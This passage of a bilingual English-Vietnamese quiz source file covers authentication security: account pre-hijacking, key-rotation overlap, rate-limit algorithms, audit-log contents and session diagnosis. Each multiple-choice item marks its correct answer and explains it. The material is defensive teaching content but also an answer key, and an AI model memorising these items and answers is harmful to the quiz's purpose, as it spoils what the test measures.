            'The attack is patient rather than clever. The attacker registers with the victim\'s address today and does nothing. Weeks later the victim arrives, sees "email already exists", clicks forgot-password, resets successfully, and believes the account is theirs. The attacker still has access, and every variant is a different piece of state that survived the reset: a session that was never revoked, a phone number or provider link attached earlier, a pending email change waiting to be confirmed. Treating the reset as a boundary closes all five with one sentence, and the sentence is testable: create an account as the attacker, run the victim\'s full claim flow, then assert that the attacker\'s session is rejected, their provider link is gone, their pending change is dead and their recovery codes are invalid. That single test covers every variant. Options 1, 2 and 4 are all worth doing — expiring unverified accounts and telling the user what they just inherited ("we signed out 1 other session and removed 1 linked account") are both real improvements — but each closes a subset. The reason this class is missed is structural: a test suite that starts from an empty database cannot find any of it, because the attacker\'s prior state is the one thing the fixtures never build.',
            'Cú tấn công này kiên nhẫn chứ không khôn khéo. Kẻ tấn công đăng ký bằng địa chỉ của nạn nhân từ hôm nay rồi không làm gì cả. Vài tuần sau nạn nhân tới, thấy "email đã tồn tại", bấm quên-mật-khẩu, đặt lại thành công, và tin rằng tài khoản là của mình. Kẻ tấn công vẫn còn quyền truy cập, và mỗi biến thể là một mẩu trạng thái khác nhau đã SỐNG SÓT qua lượt đặt lại: một phiên chưa từng bị thu hồi, một số điện thoại hay một liên kết nhà cung cấp gắn vào từ trước, một thay đổi email đang chờ xác nhận. Coi lượt đặt lại như một ranh giới là đóng cả năm bằng một câu, và câu đó kiểm thử được: tạo một tài khoản với vai kẻ tấn công, chạy trọn luồng nhận tài khoản của nạn nhân, rồi khẳng định rằng phiên của kẻ tấn công bị từ chối, liên kết nhà cung cấp của nó đã mất, thay đổi đang chờ của nó đã chết, và các mã khôi phục của nó vô hiệu. Đúng một phép kiểm ấy phủ hết mọi biến thể. Phương án 1, 2 và 4 đều đáng làm — xoá các tài khoản chưa xác minh và nói cho người dùng biết họ vừa thừa hưởng cái gì ("chúng tôi đã đăng xuất 1 phiên khác và gỡ 1 liên kết") đều là những cải thiện thật — nhưng mỗi cái chỉ đóng một phần. Lý do lớp lỗi này bị bỏ sót mang tính cấu trúc: một bộ kiểm thử khởi đầu từ một cơ sở dữ liệu rỗng thì không tìm ra được cái nào, vì trạng thái đi trước của kẻ tấn công đúng là thứ mà các bộ dữ liệu mẫu không bao giờ dựng ra.',
          ),
        }),

        /* ── Chương 11 — vận hành (3 câu) ──────────────────────────────── */

        // q45 · đáp án 0
        mcq({
          prompt: B(
            'The key that signs your access tokens also signs email verification links valid for twenty-four hours. Access tokens live fifteen minutes. How long must the overlap window be during rotation, and why?',
            'Cái khoá ký access token của bạn cũng ký cả những đường dẫn xác minh email có hạn hai mươi tư giờ. Access token sống mười lăm phút. Cửa sổ chồng lấn trong lúc xoay khoá phải dài bao lâu, và vì sao?',
          ),
          options: [
            B(
              'At least twenty-four hours plus slack, because the overlap is bounded by the longest-lived artefact the key ever signed, not by the one you had in mind',
              'Ít nhất hai mươi tư giờ cộng thêm phần dư, vì khoảng chồng lấn bị chặn bởi cái hiện vật SỐNG LÂU NHẤT mà khoá đó từng ký, chứ không phải bởi cái bạn đang nghĩ tới',
            ),
            B(
              'Fifteen minutes plus slack, because verification links are validated against the database row rather than the signature, so the key is irrelevant to them',
              'Mười lăm phút cộng phần dư, vì các đường dẫn xác minh được kiểm dựa trên dòng dữ liệu chứ không dựa trên chữ ký, nên cái khoá không liên quan gì tới chúng',
            ),
            B(
              'One JWKS cache lifetime, because once every verifier holds the new key the old one can be retired regardless of what it signed',
              'Đúng một vòng cache JWKS, vì một khi mọi bên kiểm đã cầm khoá mới thì khoá cũ rút được bất kể nó đã ký thứ gì',
            ),
            B(
              'No overlap is needed if each token carries a <code>kid</code>, since the verifier selects the key named in the token and both keys can be swapped atomically',
              'Không cần chồng lấn nếu mỗi token đều mang một <code>kid</code>, vì bên kiểm chọn đúng khoá được token gọi tên và hai khoá tráo cho nhau được một cách nguyên tử',
            ),
          ],
          correct: 0,
          explanation: EX(
            'Rotation is four words in one order: publish, sign, wait, retire. The wait is the part people size wrongly, because they size it against the artefact they were thinking about. With fifteen-minute access tokens an hour feels generous, and it is — right up until somebody clicks a verification link that was mailed twenty-three hours ago, signed by the key you retired this morning. The failures then arrive over the following day as unrelated bug tickets: a broken verification link, a dead password reset, a download URL returning an error, none of which look like a key rotation to whoever picks them up. So the rule is to enumerate everything a key signs before you rotate it, and write the overlap down per key: an hour for a key that only signs fifteen-minute tokens, eight days for a cookie secret backing a seven-day cookie, twenty-four hours plus slack for this one. Option 3 gets the order right and stops too early — the cache lifetime governs the wait between <em>publishing</em> and <em>signing</em>, which is a different gap. Option 4 misreads <code>kid</code>: it tells the verifier which key to look up, and a key that has been retired is no longer there to find, so an unknown <code>kid</code> becomes a rejection. Alert on unknown <code>kid</code> values, incidentally — it is the single metric that tells you a rotation is going wrong while it is still recoverable.',
            'Xoay khoá là bốn chữ theo đúng một thứ tự: công bố, ký, chờ, rút. Bước CHỜ là chỗ người ta hay ước lượng sai, vì họ ước lượng theo cái hiện vật đang nghĩ tới. Với access token mười lăm phút thì một tiếng nghe rất rộng rãi, và đúng là rộng rãi — cho tới khi ai đó bấm vào một đường dẫn xác minh được gửi từ hai mươi ba tiếng trước, ký bằng cái khoá bạn vừa rút sáng nay. Các sự cố khi đó về rải rác trong ngày hôm sau dưới dạng những phiếu lỗi trông chẳng liên quan: một đường dẫn xác minh hỏng, một lượt đặt lại mật khẩu chết, một URL tải file báo lỗi, chẳng cái nào trông giống một lần xoay khoá dưới mắt người nhận phiếu. Nên luật là hãy liệt kê MỌI THỨ mà một cái khoá ký trước khi xoay nó, và ghi khoảng chồng lấn xuống theo từng khoá: một tiếng cho khoá chỉ ký token mười lăm phút, tám ngày cho một bí mật cookie đỡ một cookie bảy ngày, hai mươi tư giờ cộng phần dư cho cái khoá này. Phương án 3 đúng thứ tự nhưng dừng quá sớm — vòng cache chi phối khoảng chờ giữa bước CÔNG BỐ và bước KÝ, đó là một khoảng hở khác. Phương án 4 hiểu sai <code>kid</code>: nó nói cho bên kiểm biết phải TRA khoá nào, mà một cái khoá đã rút thì không còn đó để tra nữa, nên một <code>kid</code> lạ trở thành một lời từ chối. Nhân tiện, hãy đặt cảnh báo trên các giá trị <code>kid</code> lạ — đó là chỉ số duy nhất báo cho bạn biết một lần xoay khoá đang hỏng trong khi còn cứu được.',
          ),
        }),

        // q46 · đáp án 2
        mcq({
          prompt: B(
            'A limiter is configured at ten requests per sixty seconds. Measured: ten requests at second 59 followed by ten at second 61.' +
            code('fixed window   : 20 of 20 allowed\nsliding window : 10 of 20 allowed\ntoken bucket   : 10 of 20 allowed') +
            'What does this show, and which algorithm belongs on a login endpoint?',
            'Một bộ giới hạn được đặt ở mười request mỗi sáu mươi giây. Đo thật: mười request ở giây thứ 59 rồi mười request ở giây thứ 61.' +
            code('cửa sổ cố định : cho qua 20 trên 20\ncửa sổ trượt   : cho qua 10 trên 20\ngáo token      : cho qua 10 trên 20') +
            'Điều này cho thấy gì, và thuật toán nào thuộc về một endpoint đăng nhập?',
          ),
          options: [
            B(
              'That the fixed window is misconfigured: aligning its boundary to the request stream rather than to the clock makes all three behave identically',
              'Rằng cửa sổ cố định bị cấu hình sai: căn ranh giới của nó theo dòng request thay vì theo đồng hồ là cả ba hành xử y hệt nhau',
            ),
            B(
              'That sliding window and token bucket are equivalent and interchangeable, so the choice is purely about implementation cost; either belongs on a login endpoint',
              'Rằng cửa sổ trượt và gáo token là tương đương và thay thế được cho nhau, nên lựa chọn thuần tuý là chuyện chi phí cài đặt; cái nào cũng thuộc về một endpoint đăng nhập',
            ),
            B(
              'That a fixed window lets exactly double the limit through when a burst straddles two windows, which on a login endpoint is the difference between ten guesses and twenty; a sliding window is the right choice there, being exact and affordable at low volume',
              'Rằng một cửa sổ cố định cho qua đúng GẤP ĐÔI hạn mức khi một đợt dồn nằm vắt qua hai cửa sổ, mà trên một endpoint đăng nhập thì đó là khác biệt giữa mười lượt đoán và hai mươi; cửa sổ trượt là lựa chọn đúng ở đó, vì nó chính xác và vẫn rẻ ở lưu lượng thấp',
            ),
            B(
              'That all three are unsuitable for authentication, since none of them distinguishes a failed attempt from a successful one, and only a counter keyed on failures is meaningful',
              'Rằng cả ba đều không phù hợp cho việc xác thực, vì không cái nào phân biệt một lượt hỏng với một lượt thành công, và chỉ một bộ đếm bám theo số lần HỎNG mới có ý nghĩa',
            ),
          ],
          correct: 2,
          explanation: EX(
            'All three algorithms handle ordinary traffic identically — spread the same twenty requests over two minutes and every one of them passes all twenty. They differ only in the case you deployed a limiter to stop: a burst landing exactly where two windows meet. The fixed window counts per calendar minute, so ten at second 59 and ten at second 61 are two separate buckets of ten, both under the cap, and twenty requests get through against a limit of ten. On a general API that is usually tolerable. On a login endpoint it doubles the guessing budget, which is precisely the number the limiter existed to fix. A sliding window is exact — a sorted set of timestamps with old entries trimmed — and it is more expensive, which is affordable exactly where authentication lives: low volume, high value. A token bucket is the standard choice for a general API gateway. Pick per endpoint rather than per application. Option 4 raises a real design point that is orthogonal: yes, count failures rather than requests on a login route, and count them against the account rather than the IP, but that is the axis question, not the algorithm question. Three operational traps go with all of this: <code>req.ip</code> is your load balancer unless <code>trust proxy</code> is set to the exact number of proxies you have; an in-memory counter in six instances is a limit of sixty rather than ten; and every rejection needs a <code>Retry-After</code>, without which a mobile client retries immediately and turns one refusal into something that looks exactly like an attack.',
            'Cả ba thuật toán xử lý lưu lượng bình thường y hệt nhau — rải đúng hai mươi request đó ra trong hai phút thì cả ba đều cho qua cả hai mươi. Chúng chỉ khác nhau ở đúng cái ca mà bạn triển khai bộ giới hạn để chặn: một đợt dồn rơi đúng chỗ hai cửa sổ giáp nhau. Cửa sổ cố định đếm theo từng phút của đồng hồ, nên mười cái ở giây 59 và mười cái ở giây 61 là hai cái gáo riêng biệt, mỗi cái mười, đều dưới trần, và hai mươi request lọt qua trước một hạn mức mười. Trên một API chung thì điều đó thường chịu được. Trên một endpoint đăng nhập thì nó nhân đôi ngân sách đoán mò, mà đó đúng là con số bộ giới hạn sinh ra để sửa. Cửa sổ trượt thì chính xác — một tập có thứ tự các dấu thời gian, cắt bớt các mục cũ — và nó đắt hơn, thứ chi phí đó vừa túi đúng ở nơi xác thực sinh sống: lưu lượng thấp, giá trị cao. Gáo token là lựa chọn tiêu chuẩn cho một cổng API chung. Hãy chọn THEO TỪNG ENDPOINT chứ đừng chọn cho cả ứng dụng. Phương án 4 nêu một điểm thiết kế có thật nhưng vuông góc với câu hỏi: đúng, trên một tuyến đăng nhập thì hãy đếm số lần HỎNG thay vì số request, và đếm theo TÀI KHOẢN thay vì theo IP, nhưng đó là câu hỏi về TRỤC chứ không phải câu hỏi về THUẬT TOÁN. Ba cái bẫy vận hành đi kèm tất cả những thứ trên: <code>req.ip</code> chính là bộ cân bằng tải của bạn trừ khi <code>trust proxy</code> được đặt bằng đúng số proxy bạn thật sự có; một bộ đếm nằm trong bộ nhớ của sáu instance là một hạn mức sáu mươi chứ không phải mười; và mọi lượt từ chối đều cần một <code>Retry-After</code>, thiếu nó thì một client di động thử lại ngay lập tức và biến một lời từ chối thành thứ trông y hệt một cú tấn công.',
          ),
        }),

        // q47 · đáp án 1
        mcq({
          prompt: B(
            'A support agent resets a customer\'s MFA. What must the audit record say, and what must it never contain?',
            'Một nhân viên hỗ trợ đặt lại yếu tố thứ hai cho một khách hàng. Bản ghi kiểm toán phải nói gì, và tuyệt đối không được chứa gì?',
          ),
          options: [
            B(
              'The subject is the customer, since the change was made to their account; it must never contain the customer\'s IP address, which is personal data under privacy law',
              'Chủ thể là khách hàng, vì thay đổi được thực hiện lên tài khoản của họ; nó tuyệt đối không được chứa địa chỉ IP của khách hàng, vốn là dữ liệu cá nhân theo luật riêng tư',
            ),
            B(
              'The subject is the support agent — the actor — with the customer as the object; it must never contain the credential itself, so a token appears only as a short hash or its last few characters',
              'Chủ thể là NHÂN VIÊN HỖ TRỢ — người thực hiện — còn khách hàng là đối tượng; nó tuyệt đối không được chứa chính cái tín vật, nên một token chỉ xuất hiện dưới dạng một chuỗi băm ngắn hoặc vài ký tự cuối',
            ),
            B(
              'Either party may be the subject as long as both are recorded; what must never appear is the reason for the reset, since free text in an audit log cannot be validated',
              'Bên nào làm chủ thể cũng được miễn là ghi cả hai; thứ tuyệt đối không được xuất hiện là LÝ DO đặt lại, vì văn bản tự do trong một nhật ký kiểm toán thì không kiểm chứng được',
            ),
            B(
              'The subject is the system, since the reset was performed by an automated tool on the agent\'s behalf; it must never contain a timestamp more precise than the day, to limit correlation',
              'Chủ thể là HỆ THỐNG, vì việc đặt lại do một công cụ tự động thực hiện thay mặt nhân viên; nó tuyệt đối không được chứa dấu thời gian chi tiết hơn ngày, để hạn chế việc đối chiếu chéo',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Record the actor, not the account being changed. Logging only the customer makes the most security-relevant events in your system look like the user did them to themselves — which is exactly what a help-desk social-engineering attack relies on, and it is the difference between an audit log that answers "who did this" and one that answers nothing. So the shape is: who did it, to whom, when, from where, and what the outcome was, with a stable event vocabulary defined in one place rather than free-form strings that drift. The forbidden list is short and absolute: never write passwords, even wrong ones and even hashed; never write tokens, session ids, refresh tokens, reset tokens or authorization codes; never write TOTP secrets or codes; and never log a whole request or response body on an authentication route. Store an identifier and a fingerprint instead — the last four characters of a token, or its SHA-256 — which is enough to correlate two log lines and useless to whoever steals the log. That same rule covers your error reporter and your tracing tool, which capture request bodies by default and are usually the ones that actually leak. Option 1 inverts the subject and also overstates the redaction: IP address and user agent are personal data and do belong in the record, with a stated retention period rather than removal. Options 3 and 4 each remove a field the log exists to hold.',
            'Hãy ghi NGƯỜI THỰC HIỆN, không phải cái tài khoản bị thay đổi. Chỉ ghi mỗi khách hàng sẽ khiến những sự kiện liên quan tới bảo mật nhất trong hệ thống của bạn trông như thể chính người dùng tự làm với mình — mà đó đúng là thứ mà một cú tấn công phi kỹ thuật nhắm vào bộ phận hỗ trợ dựa vào, và đó là khác biệt giữa một nhật ký kiểm toán trả lời được câu "ai đã làm việc này" với một nhật ký chẳng trả lời được gì. Nên hình dạng của nó là: ai đã làm, làm lên ai, khi nào, từ đâu, và kết quả ra sao, với một bộ từ vựng sự kiện ổn định định nghĩa ở một chỗ chứ không phải những chuỗi tự do rồi trôi dạt. Danh sách cấm thì ngắn và tuyệt đối: đừng bao giờ ghi mật khẩu, kể cả mật khẩu SAI và kể cả đã băm; đừng bao giờ ghi token, id phiên, refresh token, token đặt lại hay mã cấp phép; đừng bao giờ ghi bí mật hay mã TOTP; và đừng bao giờ ghi trọn phần thân request hay response trên một tuyến xác thực. Hãy lưu một định danh và một dấu vân tay thay vào đó — bốn ký tự cuối của một token, hoặc chuỗi SHA-256 của nó — đủ để nối hai dòng log lại với nhau và vô dụng với kẻ trộm mất cái log. Cùng luật ấy áp cho cả bộ báo lỗi và công cụ truy vết của bạn, những thứ mặc định chộp cả phần thân request và thường mới là những cái thật sự làm rò rỉ. Phương án 1 lật ngược chủ thể và cũng nói quá về việc che: địa chỉ IP và user agent là dữ liệu cá nhân và ĐÚNG là thuộc về bản ghi, kèm một thời hạn lưu trữ được nêu rõ chứ không phải bị gỡ đi. Phương án 3 và 4 mỗi cái gỡ mất một trường mà cái nhật ký sinh ra để giữ.',
          ),
        }),

        /* ── Chương 12 — chẩn đoán (3 câu) ─────────────────────────────── */

        // q48 · đáp án 3
        mcq({
          prompt: B(
            'A report says "I cannot log in". You reproduce with curl and get a 200 with a ' + c('Set-Cookie') + ' on the login call, then a 401 on the very next request. Which half of the course are you in?',
            'Một báo cáo nói "tôi không đăng nhập được". Bạn tái hiện bằng curl và nhận 200 kèm một ' + c('Set-Cookie') + ' ở lời gọi đăng nhập, rồi 401 ngay ở request kế tiếp. Bạn đang ở nửa nào của khoá học?',
          ),
          options: [
            B(
              'The password half: a 200 on login followed by a 401 means the credential was accepted provisionally and rejected on the second, stricter check',
              'Nửa mật khẩu: 200 lúc đăng nhập rồi 401 nghĩa là tín vật được chấp nhận tạm thời rồi bị từ chối ở phép kiểm thứ hai chặt hơn',
            ),
            B(
              'The authorization half, since the second request was refused after the identity was established, which is by definition a permission decision',
              'Nửa phân quyền, vì request thứ hai bị từ chối SAU khi danh tính đã được xác lập, và theo định nghĩa đó là một quyết định về quyền',
            ),
            B(
              'Neither: a 401 immediately after a successful login is always a clock problem, since the token cannot yet be expired unless the clocks disagree',
              'Không nửa nào: một mã 401 ngay sau một lượt đăng nhập thành công thì luôn là chuyện đồng hồ, vì token chưa thể hết hạn được trừ khi hai đồng hồ bất đồng',
            ),
            B(
              'The session half: authentication succeeded and the session did not survive the round trip, so the problem is in the cookie or the token, and if curl works while the browser does not it is a cookie attribute, which never appears in server logs',
              'Nửa phiên: việc xác thực đã thành công còn cái phiên thì không sống sót qua một vòng đi-về, nên vấn đề nằm ở cookie hay ở token, và nếu curl chạy được mà trình duyệt thì không thì đó là một thuộc tính cookie, thứ không bao giờ hiện ra trong log máy chủ',
            ),
          ],
          correct: 3,
          explanation: EX(
            '"Cannot log in" and "gets logged out immediately" are different bugs wearing the same sentence, and two commands separate them. A 200 on the login call means the credential was accepted — the password, the hash, the account state and the rate limiter are all fine, and everything in the first half of the course is working. A 401 on the next request means the thing that was supposed to carry identity forward did not. So you are in the session and token chapters, and the search space just halved. The curl result narrows it further. If curl works and the browser does not, it is a cookie attribute, and those never appear in server logs: <code>Secure</code> on a page served over plain http, <code>SameSite=Strict</code> when the user arrived through a cross-site redirect, a <code>Domain</code> that does not match the host, or a <code>__Host-</code> prefix silently dropping the cookie because one of its conditions is unmet. If neither works, it is server-side and you read the response body. The habit worth taking from this is the ordering of questions: how many people, which step, does it reproduce outside the browser, and what changed — where "nothing changed" almost always means the change was in configuration, which is not in the commit log.',
            '"Không đăng nhập được" và "vừa vào đã bị đăng xuất" là hai con bọ khác nhau khoác cùng một câu nói, và hai câu lệnh là tách được chúng. Mã 200 ở lời gọi đăng nhập nghĩa là tín vật đã được chấp nhận — mật khẩu, chuỗi băm, trạng thái tài khoản và bộ giới hạn tần suất đều ổn, và mọi thứ ở nửa đầu khoá học đang chạy tốt. Mã 401 ở request kế tiếp nghĩa là cái thứ lẽ ra phải mang danh tính đi tiếp đã không làm được. Vậy là bạn đang ở các chương về phiên và token, và không gian tìm kiếm vừa giảm một nửa. Kết quả curl thu hẹp nó thêm nữa. Nếu curl chạy được mà trình duyệt thì không, đó là một thuộc tính cookie, và loại đó không bao giờ hiện ra trong log máy chủ: <code>Secure</code> trên một trang phục vụ qua http trần, <code>SameSite=Strict</code> khi người dùng tới qua một lệnh chuyển hướng xuyên trang, một <code>Domain</code> không khớp host, hay một tiền tố <code>__Host-</code> lặng lẽ làm cookie bị vứt vì một trong các điều kiện của nó không được thoả. Nếu cả hai đều không chạy thì đó là chuyện phía máy chủ và bạn đọc phần thân phản hồi. Thói quen đáng mang về từ đây là THỨ TỰ CÁC CÂU HỎI: bao nhiêu người, bước nào, có tái hiện được ngoài trình duyệt không, và cái gì đã thay đổi — mà "chẳng có gì thay đổi cả" gần như luôn nghĩa là thay đổi nằm ở cấu hình, thứ không có trong lịch sử commit.',
          ),
        }),

        // q49 · đáp án 3
        mcq({
          prompt: B(
            'Users report being signed out "after about a day" and separately "at random, a few of them, all day". What does each shape point at?',
            'Người dùng báo bị đăng xuất "sau khoảng một ngày", và một nhóm khác báo "ngẫu nhiên, vài người, suốt cả ngày". Mỗi hình dạng ấy chỉ vào đâu?',
          ),
          options: [
            B(
              'Both point at the same cause — an expiry somewhere — and differ only in how attentive the reporters are; find the shortest lifetime in the system and lengthen it',
              'Cả hai chỉ vào cùng một nguyên nhân — một cái hạn nào đó — và chỉ khác nhau ở mức chú ý của người báo; hãy tìm cái vòng đời ngắn nhất trong hệ thống rồi kéo dài nó ra',
            ),
            B(
              'The first is a clock problem on the users\' devices and the second is network flakiness; neither is worth chasing until they correlate with a deploy',
              'Cái đầu là chuyện đồng hồ trên thiết bị người dùng còn cái sau là mạng chập chờn; không cái nào đáng đuổi theo cho tới khi chúng tương quan với một lần deploy',
            ),
            B(
              'The first is a rotation gone wrong and the second is the same rotation observed by users whose cache had not yet refreshed; both resolve when the key set settles',
              'Cái đầu là một lần xoay khoá hỏng còn cái sau là chính lần xoay đó nhìn từ phía những người dùng có cache chưa kịp làm mới; cả hai tự hết khi bộ khoá ổn định lại',
            ),
            B(
              '"After exactly N" means some lifetime is N — a day or seven is usually a cookie <code>Max-Age</code>, thirty days a refresh token — while "random, a few users, all day" is concurrency or affinity: false reuse detections from the refresh race, or a session store that is not shared across instances',
              '"Sau đúng N" nghĩa là có một vòng đời nào đó bằng N — một hoặc bảy ngày thường là <code>Max-Age</code> của cookie, ba mươi ngày là refresh token — còn "ngẫu nhiên, vài người, suốt ngày" là chuyện đồng thời hoặc chuyện dính máy: các lượt phát hiện tái dùng giả từ cuộc đua refresh, hoặc một kho phiên không dùng chung giữa các instance',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Failure shapes are a diagnostic tool because they narrow the search space before you read any code. "Works, then stops after exactly N" says a lifetime somewhere equals N, and the number <em>is</em> the diagnosis: fifteen minutes is an access token, a day or seven is a cookie <code>Max-Age</code>, thirty days is a refresh token or a remembered device, ninety days is a certificate. Find which one is N and you have found the bug. "Random, a few users, all day" is the shape that is almost never random, and two questions settle it: what time exactly did it last happen, and did the user have more than one tab open. Two tabs plus a false reuse detection is the refresh race, reproducible with <code>Promise.all</code>; a consistent interval with one tab is the first shape instead; and correlation with which instance served the request points at an in-memory session store behind a load balancer with no sticky sessions — which is, by some distance, the most common cause of this report, because it works perfectly in development. Two other shapes are worth having in the same list: "everyone logged out at once" means one shared thing changed, with four suspects all checkable in minutes, and "old accounts work, new ones do not" means the dividing line is a timestamp, usually a hash-parameter or normalisation change without a backfill. Option 1 would extend the wrong lifetime and hide the second problem entirely.',
            'Các hình dạng hỏng là một công cụ chẩn đoán vì chúng thu hẹp không gian tìm kiếm TRƯỚC khi bạn đọc bất kỳ dòng mã nào. "Chạy được, rồi dừng sau đúng N" nói rằng có một vòng đời nào đó bằng N, và chính CON SỐ ĐÓ là lời chẩn đoán: mười lăm phút là một access token, một hoặc bảy ngày là <code>Max-Age</code> của cookie, ba mươi ngày là một refresh token hoặc một thiết bị được nhớ, chín mươi ngày là một chứng chỉ. Tìm ra cái nào bằng N là bạn đã tìm ra con bọ. "Ngẫu nhiên, vài người, suốt ngày" là hình dạng gần như không bao giờ ngẫu nhiên, và hai câu hỏi là chốt được: lần gần nhất nó xảy ra vào đúng mấy giờ, và người dùng có mở nhiều hơn một tab không. Hai tab cộng một lượt phát hiện tái dùng giả chính là cuộc đua refresh, tái hiện được bằng <code>Promise.all</code>; một khoảng thời gian đều đặn với đúng một tab thì lại là hình dạng thứ nhất; còn nếu nó tương quan với việc instance nào đã trả lời thì đó chỉ vào một kho phiên nằm trong bộ nhớ đứng sau một bộ cân bằng tải không có phiên dính máy — và đó, bỏ xa các nguyên nhân khác, là thủ phạm phổ biến nhất của loại báo cáo này, bởi vì nó chạy hoàn hảo trên máy lập trình viên. Hai hình dạng nữa đáng để cùng một danh sách: "tất cả bị đăng xuất cùng lúc" nghĩa là một thứ DÙNG CHUNG vừa thay đổi, với bốn nghi phạm đều kiểm được trong vài phút, còn "tài khoản cũ chạy, tài khoản mới thì không" nghĩa là đường phân chia là một dấu thời gian, thường là một lần đổi tham số băm hoặc đổi luật chuẩn hoá mà không chạy bù dữ liệu. Phương án 1 sẽ kéo dài nhầm cái vòng đời và giấu biến vấn đề thứ hai đi.',
          ),
        }),

        // q50 · đáp án 1
        mcq({
          prompt: B(
            'During an incident you need to know what is inside a production JWT, and whether a route is actually mounted on the running container. What are the two safe moves?',
            'Trong một sự cố bạn cần biết bên trong một JWT trên production có gì, và một tuyến có thật sự được gắn trên container đang chạy hay không. Hai nước đi an toàn là gì?',
          ),
          options: [
            B(
              'Paste the token into a decoder website to read the claims quickly, and open the route in a browser: a login redirect proves the route exists and is protected',
              'Dán token vào một trang web giải mã để đọc nhanh các claim, và mở tuyến đó trong trình duyệt: một lệnh chuyển hướng về trang đăng nhập chứng minh tuyến tồn tại và đang được bảo vệ',
            ),
            B(
              'Decode the segments locally with a shell command, since the token never has to leave your machine, and curl the route unauthenticated: 401 means mounted and demanding auth, 200 means mounted and public, 404 means it is not there — usually a stale or partial build',
              'Giải mã các đoạn ngay tại máy bằng một câu lệnh shell, vì token không cần rời khỏi máy bạn, và curl vào tuyến đó KHÔNG kèm xác thực: 401 nghĩa là đã gắn và đang đòi xác thực, 200 nghĩa là đã gắn và công khai, 404 nghĩa là nó không có ở đó — thường là một bản dựng cũ hoặc dựng dở',
            ),
            B(
              'Verify the token with the production key on a staging machine so the claims are trustworthy, and check the route by reading the router file in the deployed image',
              'Kiểm token bằng khoá production trên một máy staging để các claim đáng tin, và kiểm tuyến bằng cách đọc file router bên trong ảnh đã triển khai',
            ),
            B(
              'Ask the user to send you their token so you can reproduce their exact session, and check the route by watching whether it appears in the access log within the next few minutes',
              'Nhờ người dùng gửi token của họ để bạn tái hiện đúng phiên của họ, và kiểm tuyến bằng cách xem nó có xuất hiện trong log truy cập trong vài phút tới hay không',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Both moves are about not creating a second incident while investigating the first. Pasting a production token into a website is the single most common way a working session token leaves an organisation during an incident — the token is a bearer credential, so whoever receives it can be that user until it expires. You do not need the site: two segments of the token are base64url JSON, and a shell decode reads them without the token going anywhere. Read the header first, because it answers half the questions — the algorithm, and the <code>kid</code>, where an unexpected value means a rotation is mid-flight. Convert <code>exp</code> to an ISO string before arguing about it. And remember that decoding is not verifying: for that you need the key and the full set of claim checks. The route probe is the second half. An unauthenticated curl distinguishes three states cleanly, and the one that matters is <b>404</b>, which does not mean "forbidden" — it means the running container does not have that route, so what is deployed is not what you built. Option 1 fails on both counts, since a browser redirect tells you far less than a status code. Option 3 puts a production key on a staging machine and reads a file instead of asking the running process. Option 4 asks a user for a live credential, which is exactly the request a phisher makes.',
            'Cả hai nước đi đều nhằm KHÔNG tạo ra một sự cố thứ hai trong lúc đang điều tra sự cố thứ nhất. Dán một token production vào một trang web là cách phổ biến nhất khiến một token phiên còn chạy được rời khỏi một tổ chức trong lúc có sự cố — token là một tín vật mang theo, nên ai nhận được nó đều LÀ người dùng đó cho tới lúc nó hết hạn. Bạn không cần cái trang đó: hai đoạn của token là JSON dạng base64url, và một câu lệnh shell đọc được chúng mà token không đi đâu cả. Hãy đọc header trước, vì nó trả lời một nửa số câu hỏi — thuật toán, và <code>kid</code>, nơi một giá trị bất ngờ nghĩa là một lần xoay khoá đang diễn ra dở. Đổi <code>exp</code> sang chuỗi ISO trước khi tranh luận về nó. Và nhớ rằng GIẢI MÃ KHÔNG PHẢI LÀ KIỂM: muốn kiểm thì cần khoá và trọn bộ các phép kiểm claim. Phép thăm dò tuyến là nửa còn lại. Một lệnh curl không kèm xác thực phân biệt sạch sẽ ba trạng thái, và cái quan trọng là <b>404</b>, thứ KHÔNG có nghĩa là "bị cấm" — nó nghĩa là container đang chạy không có cái tuyến đó, tức thứ đang được triển khai không phải thứ bạn vừa dựng. Phương án 1 trượt ở cả hai vế, vì một lệnh chuyển hướng của trình duyệt cho biết ít hơn hẳn một mã trạng thái. Phương án 3 mang một khoá production lên máy staging và đọc một file thay vì hỏi chính cái tiến trình đang chạy. Phương án 4 xin người dùng một tín vật đang sống, mà đó đúng là lời đề nghị mà một kẻ lừa đảo đưa ra.',
          ),
        }),
      ],
    },
  ],
};
